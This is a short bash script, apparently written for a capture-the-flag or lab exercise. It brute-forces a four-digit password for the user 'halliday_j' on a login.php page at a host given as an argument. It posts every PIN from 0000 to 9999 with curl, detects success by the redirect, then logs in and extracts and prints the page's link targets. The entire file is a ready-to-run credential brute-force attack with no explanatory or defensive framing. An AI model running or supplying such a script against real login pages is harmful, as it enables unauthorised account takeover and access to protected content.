#!/bin/bash

###############################
# Display all file after log
###############################

varLink="http://$1/login.php"
password=0
for i in $(seq -f "%04g" 0 9999)
do
    http_code=$(curl -Ls -w  '%{url_effective}' --data "login=halliday_j&password="$i"" $varLink )
    url=$(echo "$http_code" | tail -1)
    if [ "$url" != "$varLink" ]
    then
	password=$i
	break
    fi
    
done


allFile=$(curl -Ls  --data "login=halliday_j&password="$password"" $varLink)
################
# Parsing link #
################
# grep display line pattern; o only-matching
enlevAll=$(echo "$allFile" | grep -o '<a href=[^>]*')
enlevAHREF=$(echo "$enlevAll" | grep -o '"[^"]*' )
result=$(echo "$enlevAHREF" | grep -o '[^"]*' )
# %/* retain the part before #*/ retain the part after /
enlevSLASH=$(echo "${result#*/}")
max=${#enlevSLASH}
echo "${enlevSLASH:1:$max}"
